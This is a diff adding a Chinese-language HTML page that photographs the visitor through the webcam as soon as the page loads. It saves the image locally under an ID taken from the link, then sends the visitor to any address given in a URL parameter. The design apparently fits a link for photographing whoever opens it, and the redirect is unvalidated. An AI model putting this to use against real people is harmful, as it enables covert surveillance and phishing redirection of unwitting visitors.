@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>正在拍摄中...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            color: white;
+        }
+        .capture-container {
+            text-align: center;
+        }
+        #video {
+            display: none;
+        }
+        #canvas {
+            display: none;
+        }
+        .loading {
+            font-size: 18px;
+        }
+        .countdown {
+            font-size: 24px;
+            font-weight: bold;
+            color: #ff4444;
+        }
+    </style>
+</head>
+<body>
+    <div class="capture-container">
+        <h2>正在准备拍摄...</h2>
+        <div class="loading" id="loadingText">请允许访问摄像头...</div>
+        <div class="countdown" id="countdown" style="display: none;"></div>
+        
+        <video id="video" width="480" height="640"></video>
+        <canvas id="canvas" width="480" height="640"></canvas>
+    </div>
+
+    <script>
+        let countdownInterval;
+        let countdownValue = 3;
+        const urlParams = new URLSearchParams(window.location.search);
+        const redirectUrl = urlParams.get('url') || 'http://baidu.com';
+        const id = urlParams.get('id');
+
+        function startCapture() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            if (!id) {
+                alert('缺少必要的参数！');
+                window.location.href = 'index.html';
+                return;
+            }
+
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(function(stream) {
+                        video.srcObject = stream;
+                        video.play();
+                        
+                        document.getElementById('loadingText').textContent = '摄像头已连接，准备拍摄...';
+                        
+                        // 显示倒计时
+                        document.getElementById('countdown').style.display = 'block';
+                        startCountdown(() => {
+                            // 拍摄照片
+                            context.drawImage(video, 0, 0, 480, 640);
+                            
+                            // 将照片保存到本地存储
+                            const imageData = canvas.toDataURL('image/png');
+                            saveImage(id, imageData);
+                            
+                            // 停止摄像头
+                            stream.getTracks().forEach(track => track.stop());
+                            
+                            // 跳转到指定页面
+                            setTimeout(() => {
+                                window.location.href = redirectUrl;
+                            }, 500);
+                        });
+                    })
+                    .catch(function(error) {
+                        console.error('摄像头访问失败:', error);
+                        document.getElementById('loadingText').innerHTML = 
+                            '操作失败，权限不够！<br>请确保已允许访问摄像头并刷新页面重试。';
+                    });
+            } else {
+                document.getElementById('loadingText').textContent = '您的浏览器不支持摄像头功能！';
+            }
+        }
+
+        function startCountdown(callback) {
+            const countdownElement = document.getElementById('countdown');
+            countdownElement.textContent = countdownValue;
+            
+            countdownInterval = setInterval(() => {
+                countdownValue--;
+                countdownElement.textContent = countdownValue;
+                
+                if (countdownValue <= 0) {
+                    clearInterval(countdownInterval);
+                    countdownElement.textContent = '拍摄中...';
+                    callback();
+                }
+            }, 1000);
+        }
+
+        function saveImage(id, imageData) {
+            // 使用 localStorage 模拟图片存储
+            const timestamp = new Date().getTime();
+            const key = `photo_${id}_${timestamp}`;
+            
+            try {
+                localStorage.setItem(key, imageData);
+                console.log('照片已保存到本地存储');
+            } catch (e) {
+                console.error('存储空间不足:', e);
+                // 如果 localStorage 满了，删除最旧的照片
+                clearOldPhotos();
+                localStorage.setItem(key, imageData);
+            }
+        }
+
+        function clearOldPhotos() {
+            const keys = Object.keys(localStorage);
+            const photoKeys = keys.filter(key => key.startsWith('photo_'));
+            
+            // 删除超过7天的老照片
+            const sevenDaysAgo = Date.now() - (7 * 24 * 60 * 60 * 1000);
+            
+            photoKeys.forEach(key => {
+                const timestamp = parseInt(key.split('_')[2]);
+                if (timestamp < sevenDaysAgo) {
+                    localStorage.removeItem(key);
+                }
+            });
+        }
+
+        // 页面加载完成后开始拍摄流程
+        window.addEventListener('DOMContentLoaded', startCapture);
+    </script>
+</body>
+</html>
